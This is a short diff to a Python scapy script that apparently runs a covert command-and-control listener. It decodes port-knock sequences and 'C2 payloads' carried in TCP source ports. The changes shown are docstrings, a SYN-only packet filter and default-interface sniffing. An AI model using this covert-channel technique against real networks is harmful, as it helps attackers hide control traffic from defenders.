@@ -70,6 +70,7 @@ stage = {}      # stage of command's port knocks
 seq = {}        # sequence no. in TCP headers
 
 def pkt_handler(pkt):
+    """Translate the SrcPort values into knock sequences or C2 payloads."""
     global knocks
     global c2data
     global seq
@@ -372,14 +373,15 @@ def parse_args():
 
 def sniffer_thread():
     """The sniffer thread that handles ingress packets"""
-    # Packet filter in BPF syntax
-    filter = f'tcp[tcpflags] & tcp-syn != 0 and dst host {dhost} and dst port {dport}'
+    # SYN Packet filter in BPF syntax
+    filter = f'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0 and dst host {dhost} and dst port {dport}'
 
-    printmsg(f'Sniffing packets with filter "{filter}" ...')
-    sniff(filter=filter, prn=pkt_handler, store=False, iface=list(conf.ifaces))
+    printmsg(f'Sniffing packets on interface {conf.iface} with filter "{filter}" ...')
+    sniff(filter=filter, prn=pkt_handler, store=False)
 
 
 def check_root():
+    """Check if we have the root priv."""
     if os.geteuid() != 0:
         raise PermissionError("This script must be run as root.")
 
